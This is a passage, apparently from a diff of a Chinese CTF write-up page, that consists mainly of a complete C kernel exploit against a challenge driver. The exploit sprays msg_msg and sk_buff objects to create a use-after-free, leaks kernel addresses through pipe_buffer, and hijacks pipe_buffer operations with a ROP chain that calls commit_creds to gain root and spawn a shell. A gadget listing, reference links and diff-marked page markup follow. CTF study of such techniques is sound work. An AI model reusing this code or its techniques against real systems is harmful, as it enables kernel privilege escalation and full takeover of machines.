pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">256</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[real_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to release secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="string">&#x27;Z&#x27;</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(oob_msg.mtext, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msg.mtext));</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">704</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)fake_secondary_msg)[i] = victim_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_offset = kernel_addr - <span class="number">0xffffffff81e2d980</span>;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff8224aca0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810bb710</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811af57d</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs_iretq = <span class="number">0xffffffff81a010eb</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> push_rsi_pop_rsp_rbx_r12 = <span class="number">0xffffffff8133151b</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_secondary_msg + <span class="number">0x18</span>) = <span class="number">0xffffffff81000390</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_creds;</span><br><span class="line">    rop_chain[rop++] = swapgs_iretq;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rop_chain is ready\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray sk_buff complete!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230331103838088.png"
-                      alt="image-20230331103838088"
-                ></p>
+<p><img   src="/images/image-20230331103838088.png"  alt="image-20230331103838088"></p>
 <p>吐槽一下：一道题目用了五个gadget文件！！！</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ctf ls -l | grep gadget</span><br><span class="line">-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt</span><br><span class="line">-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p>参考链接:<br>    <a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/" >https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068" >https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>    墨晚鸢佬自己有题目链接，这里就不上传啦。</p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/04/20/io-uring/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">io_uring在kernel pwn中的优异表现</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/msg-msg/">msg_msg</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/sk-buff/">sk_buff</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pipe-buffer/">pipe_buffer</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/qemu-escape/">qemu escape</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">FUZZ(2):AFL结果分析和代码覆盖率</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
